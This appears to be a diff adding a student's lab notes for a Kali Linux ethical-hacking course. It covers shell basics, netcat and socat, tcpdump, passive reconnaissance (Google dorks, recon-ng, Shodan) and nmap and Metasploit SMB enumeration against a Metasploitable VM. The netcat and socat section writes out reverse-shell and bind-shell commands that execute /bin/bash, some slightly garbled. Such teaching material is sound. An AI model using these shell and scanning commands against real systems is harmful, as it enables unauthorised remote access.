@@ -1,0 +1,156 @@
+Prac1- Kali Installation, apt-get update, Metasploitable install
+
+
+Prac2 - Exploring Commandline in kali
+A)Positional Parameters
+nano file_name.txt
+echo "DISPLAYING POSITIONAL PARAMETER"
+echo "FILENAME: $0"
+echo "ARGUMENT 1: $1"
+echo "ARGUMENT 2: $2"
+echo "ARGUMENT 3: $3"
+echo "TOTAL ARGUMENTS: $#"
+
+chmod +x file_name.txt
+bash file_name.txt welcome to kalia
+
+B)Comparing files
+nano file1.txt
+nano file2.txt
+cat file1.txt
+cat file2.txt
+
+diff file1.txt file2.txt
+diff -w file1.txt file2.txt
+diff -q file1.txt file2.txt
+diff -u file1.txt file2.txt
+
+C)Managing Processes
+sudo apt-get install colordiff
+colordiff file1.txt file2.txt
+comm file1.txt file2.txt
+comm -23 file1.txt file2.txt
+comm -13 file1.txt file2.txt
+ps
+kill -9 27316
+pstree
+nice -n 19 sleep 30 &
+renice -n 19 sleep 30 &
+
+
+Prac3 - Netcat Socat
+nc -h
+nc - vzu metasploit_vm_ip 20-100
+nc -lvp 1234
+sudo nc kali_vm_ip 1234
+
+A)Banner Grabbing
+nc metasploit_vm_ip 21
+nc metasploit_vm_ip 80
+
+B)File transfer via netcat
+nano file.txt
+cat file.txt
+nc -lvp 2345<file.txt
+nc kali_vm_ip 2345 >file.txt
+
+C)Reverse Shell
+nc -lvp 666
+bin/sh 0</tmp/backpipe | nc kali_vm_ip port 1>/tmp/backpipea
+
+d)Bind Shell/ Reverse Shell using Socat
+sudo socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash (on metasploit)
+socat - TCP4:metasploit_vm_ip:4444
+
+socat -d -d TCP4-LISTEN:4443 STDOUT (Kali_VM)
+socat TCP4:kali_vm_ip:4443 EXEC:/bin/bash
+
+D)File Transfer via socat
+socat TCP4-LISTEN:443,fork file:file.txt
+
+E)TCP DUMP
+sudo apt-get install tcpdump
+tcpdump -i eth0
+tcpdump -c 5 -i eth0 (capture specific number of packets)
+tcpdump -A -i eth0 (print captured packet in ascii format)
+tcpdump -D (display interfaces)
+tcpdump -n -i eth0 (Capture ip address of packet)
+tcpdump -c 5 -i eth0 tcp (capture only tcp packet)
+tcpdump -i eth0 port 22 (capture from specific port)
+tcpdump -i eth0 dst 8.8.8.8 (packet from destination ip)
+tcpdump -i eth0 src *IP* (oacket from source ip)
+tcpdump -n tcp (filtering by protocol)
+
+Prac4 - Passive INFO Gathering
+A)Google Hacking
+site:mu.ac.in
+inurl:mu
+intitle:kali
+filetype: pdf
+"offensive security"
+cyber security -site: wikipedia.org
+"river: AND "cap"
+"river" OR "town"
+
+advanced operators
+intitle:"webcampXP 5"
+amazon.com filetype:pdf
+filetype: log
+
+B)WHOIS ENUMERATION
+whoislookup
+
+C)NETCRAFT Tool
+netcraft.com
+
+D)Recon-ng Tool
+recon-ng
+workspaces create test
+marketplace search
+marketplace install
+modules install
+options set source mu.ac.in
+info
+input
+run
+
+E)Shodan
+pip install shodan
+shodan.com (website)
+shodan init
+shodan host ip_address
+shodan download microsoft-data microsoft iis 6.0
+shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz
+
+F)SSL SERVER TEST USING SSLSCAN AND tlssled
+sslscan www.ethicalhackingblog.com
+tlssled www.ethicalhackingblog.com 443
+
+
+Prac5 - Active INFO Gathering
+A)DNS ENUMERATION
+dnsenum -r www.nesedu.in
+nmap -sS ip (PORT SCANNING)
+nmap -p 1-1000 ip (SCAN SPECIFIC PORT)
+nmap -p 22,23,100-150 ip (SCAN SPECIFIC PORT)
+nmap -v -A -sV ip (VERBOSE OPTION SCAN)
+nping --tcp -p 22 --flags syn --ttl 2 ip (NPING)
+sudo apt-get install pnscan
+t_listen -ip (port scan using pnscan)
+pnscan -h
+
+B)SMB ENUMERATION
+use auxiliary/scanner/smb/smb_enumusers
+show options
+use auxiliary/scanner/smb/smb_enumshares
+set RHOST own_ip
+exploit
+
+
+Prac6- Vulnerability scanning with nmap
+open nmap 
+enter ip/web name > scan
+click nmap output & details
+
+
+
